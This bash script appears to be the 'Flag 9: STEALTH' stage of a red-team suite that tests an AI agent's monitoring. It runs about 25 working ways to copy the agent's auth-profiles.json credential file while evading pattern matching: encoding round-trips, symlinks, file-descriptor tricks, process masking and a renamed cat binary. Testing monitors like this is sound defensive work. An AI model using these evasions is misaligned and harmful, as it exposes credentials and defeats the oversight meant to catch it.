#!/usr/bin/env bash
# Red Lobster v7 — Flag 9: STEALTH — Read files without triggering pattern matching
# NO sudo. All user-level.
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/redlobster-lib.sh"

rl_init_flag "flag9" "Flag 9: STEALTH — Pattern matching evasion"

CRED="/home/openclaw/.openclaw/agents/main/agent/auth-profiles.json"
OUTDIR="$FLAG_DIR"

# Basic evasions
rl_run "cat via env var" \
  "CMD=cat; \$CMD '$CRED' > '$OUTDIR/9_1.txt'"

rl_run "tac (reverse cat)" \
  "tac '$CRED' | tac > '$OUTDIR/9_2.txt'"

rl_run "rev + rev roundtrip" \
  "rev '$CRED' | rev > '$OUTDIR/9_3.txt'"

rl_run "head -n 99999" \
  "head -n 99999 '$CRED' > '$OUTDIR/9_4.txt'"

rl_run "tail -n +1 (print all)" \
  "tail -n +1 '$CRED' > '$OUTDIR/9_5.txt'"

rl_run "paste" \
  "paste '$CRED' > '$OUTDIR/9_6.txt'"

rl_run "install -m 644" \
  "install -m 644 '$CRED' '$OUTDIR/9_7.txt'"

rl_run "find -exec cat" \
  "find '$CRED' -exec cat {} \\; > '$OUTDIR/9_8.txt' 2>/dev/null"

rl_run "xargs cat" \
  "echo '$CRED' | xargs cat > '$OUTDIR/9_9.txt'"

rl_run "while read line" \
  "while IFS= read -r line; do echo \"\$line\"; done < '$CRED' > '$OUTDIR/9_10.txt'"

rl_run "dd (small bs)" \
  "dd if='$CRED' of='$OUTDIR/9_11.txt' bs=1 2>/dev/null"

rl_run "xxd + xxd -r" \
  "xxd '$CRED' | xxd -r > '$OUTDIR/9_12.txt'"

rl_run "base64 + base64 -d" \
  "base64 '$CRED' | base64 -d > '$OUTDIR/9_13.txt'"

rl_run "gzip + gunzip pipeline" \
  "gzip -c '$CRED' | gunzip > '$OUTDIR/9_14.txt'"

# Indirection
rl_run "symlink + cat" \
  "ln -sf '$CRED' '$OUTDIR/link9' && cat '$OUTDIR/link9' > '$OUTDIR/9_15.txt'; rm -f '$OUTDIR/link9'"

rl_run "hardlink + cat" \
  "ln '$CRED' '$OUTDIR/hlink9' 2>/dev/null && cat '$OUTDIR/hlink9' > '$OUTDIR/9_16.txt'; rm -f '$OUTDIR/hlink9'"

rl_run "fd redirect (exec 3<)" \
  "exec 3< '$CRED'; cat <&3 > '$OUTDIR/9_17.txt'; exec 3<&-"

rl_run "/proc/self/fd read" \
  "exec 3< '$CRED'; cat /proc/self/fd/3 > '$OUTDIR/9_18.txt'; exec 3<&-"

rl_run "bash process substitution" \
  "cat <(cat '$CRED') > '$OUTDIR/9_19.txt'"

rl_run "named pipe (mkfifo)" \
  "mkfifo '$OUTDIR/pipe9' 2>/dev/null; (cat '$CRED' > '$OUTDIR/pipe9' &); cat '$OUTDIR/pipe9' > '$OUTDIR/9_20.txt'; rm -f '$OUTDIR/pipe9'"

# Process masking
rl_run "exec -a systemd-helper" \
  "bash -c 'exec -a systemd-helper bash -c \"cat $CRED > $OUTDIR/9_21.txt\"'"

rl_run "script -c wrapper" \
  "script -qc \"cat '$CRED'\" '$OUTDIR/9_22.txt' 2>/dev/null"

rl_run "busybox cat" \
  "busybox cat '$CRED' > '$OUTDIR/9_23.txt' 2>/dev/null"

# Encoding obfuscation
rl_run "hex-encoded cat (\$'\\x63\\x61\\x74')" \
  "\$'\\x63\\x61\\x74' '$CRED' > '$OUTDIR/9_24.txt' 2>/dev/null"

# Copy binary and rename
rl_run "cp /usr/bin/cat to healthcheck" \
  "cp /usr/bin/cat '$OUTDIR/healthcheck' && '$OUTDIR/healthcheck' '$CRED' > '$OUTDIR/9_25.txt'; rm -f '$OUTDIR/healthcheck'"

rl_summary
rl_cleanup
